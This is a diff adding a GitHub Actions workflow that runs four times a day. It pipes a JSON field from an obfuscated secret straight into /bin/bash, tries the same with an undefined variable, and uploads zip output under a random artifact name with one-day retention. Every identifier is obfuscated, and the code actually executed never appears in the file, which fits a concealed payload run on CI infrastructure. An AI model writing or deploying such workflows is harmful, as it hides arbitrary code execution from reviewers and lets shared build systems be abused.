@@ -1,0 +1,32 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          ih47: ${{ secrets.ih47 }}
+        run: |
+          printf '%s' "$ih47" | jq -r .xqh4828 | /bin/bash
+          echo $t5 | jq -r .qdow77 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: lrWO8UiK
+          path: "*.zip"
+          retention-days: 1
